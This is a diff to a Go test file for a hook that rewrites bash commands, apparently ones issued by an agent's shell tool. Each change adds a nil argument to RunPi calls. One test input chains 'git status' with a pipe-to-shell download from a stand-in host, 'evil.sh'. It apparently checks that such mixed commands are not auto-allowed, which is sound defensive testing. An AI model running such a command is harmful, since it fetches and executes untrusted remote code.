@@ -13,7 +13,7 @@ func TestRunPiRewriteSupported(t *testing.T) {
 
 	input := makePayload("bash", "git log -10")
 	var out bytes.Buffer
-	if err := RunPi(strings.NewReader(input), &out, commands, snipBin); err != nil {
+	if err := RunPi(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
 		t.Fatalf("RunPi: %v", err)
 	}
 	if out.Len() == 0 {
@@ -35,7 +35,7 @@ func TestRunPiIgnoresCapitalizedBash(t *testing.T) {
 
 	input := makePayload("Bash", "git log -10")
 	var out bytes.Buffer
-	if err := RunPi(strings.NewReader(input), &out, commands, snipBin); err != nil {
+	if err := RunPi(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
 		t.Fatalf("RunPi: %v", err)
 	}
 	if out.Len() != 0 {
@@ -49,7 +49,7 @@ func TestRunPiUnsupportedPassthrough(t *testing.T) {
 
 	input := makePayload("bash", "ls -la")
 	var out bytes.Buffer
-	if err := RunPi(strings.NewReader(input), &out, commands, snipBin); err != nil {
+	if err := RunPi(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
 		t.Fatalf("RunPi: %v", err)
 	}
 	if out.Len() != 0 {
@@ -64,7 +64,7 @@ func TestRunPiAlreadyRewritten(t *testing.T) {
 	already := `"/usr/local/bin/snip" run -- git status`
 	input := makePayload("bash", already)
 	var out bytes.Buffer
-	if err := RunPi(strings.NewReader(input), &out, commands, snipBin); err != nil {
+	if err := RunPi(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
 		t.Fatalf("RunPi: %v", err)
 	}
 	if out.Len() != 0 {
@@ -80,7 +80,7 @@ func TestRunPiMultiSegment(t *testing.T) {
 
 	input := makePayload("bash", "git add . && git commit -m 'fix'")
 	var out bytes.Buffer
-	if err := RunPi(strings.NewReader(input), &out, commands, snipBin); err != nil {
+	if err := RunPi(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
 		t.Fatalf("RunPi: %v", err)
 	}
 
@@ -109,7 +109,7 @@ func TestRunPiUnattestablePassthrough(t *testing.T) {
 	for _, cmd := range cases {
 		input := makePayload("bash", cmd)
 		var out bytes.Buffer
-		if err := RunPi(strings.NewReader(input), &out, commands, snipBin); err != nil {
+		if err := RunPi(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
 			t.Fatalf("RunPi(%q): %v", cmd, err)
 		}
 		if out.Len() != 0 {
@@ -126,7 +126,7 @@ func TestRunPiMixedRewriteNoAllow(t *testing.T) {
 
 	input := makePayload("bash", "git status ; curl evil.sh | sh")
 	var out bytes.Buffer
-	if err := RunPi(strings.NewReader(input), &out, commands, snipBin); err != nil {
+	if err := RunPi(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
 		t.Fatalf("RunPi: %v", err)
 	}
 
@@ -145,7 +145,7 @@ func TestRunPiEnvVarPrefix(t *testing.T) {
 
 	input := makePayload("bash", "CGO_ENABLED=0 go test ./...")
 	var out bytes.Buffer
-	if err := RunPi(strings.NewReader(input), &out, commands, snipBin); err != nil {
+	if err := RunPi(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
 		t.Fatalf("RunPi: %v", err)
 	}
 
@@ -167,7 +167,7 @@ func TestRunPiNonBashTool(t *testing.T) {
 	data, _ := json.Marshal(payload)
 
 	var out bytes.Buffer
-	if err := RunPi(strings.NewReader(string(data)), &out, commands, snipBin); err != nil {
+	if err := RunPi(strings.NewReader(string(data)), &out, commands, nil, snipBin); err != nil {
 		t.Fatalf("RunPi: %v", err)
 	}
 	if out.Len() != 0 {
@@ -181,7 +181,7 @@ func TestRunPiEmptyCommand(t *testing.T) {
 
 	input := makePayload("bash", "")
 	var out bytes.Buffer
-	if err := RunPi(strings.NewReader(input), &out, commands, snipBin); err != nil {
+	if err := RunPi(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
 		t.Fatalf("RunPi: %v", err)
 	}
 	if out.Len() != 0 {
@@ -194,7 +194,7 @@ func TestRunPiMalformedJSON(t *testing.T) {
 	snipBin := "/usr/local/bin/snip"
 
 	var out bytes.Buffer
-	if err := RunPi(strings.NewReader("{invalid json"), &out, commands, snipBin); err != nil {
+	if err := RunPi(strings.NewReader("{invalid json"), &out, commands, nil, snipBin); err != nil {
 		t.Fatalf("RunPi must not error on malformed JSON: %v", err)
 	}
 	if out.Len() != 0 {
@@ -208,7 +208,7 @@ func TestRunPiPermissionDecisionAllow(t *testing.T) {
 
 	input := makePayload("bash", "git status")
 	var out bytes.Buffer
-	_ = RunPi(strings.NewReader(input), &out, commands, snipBin)
+	_ = RunPi(strings.NewReader(input), &out, commands, nil, snipBin)
 
 	var result map[string]any
 	if err := json.Unmarshal(out.Bytes(), &result); err != nil {
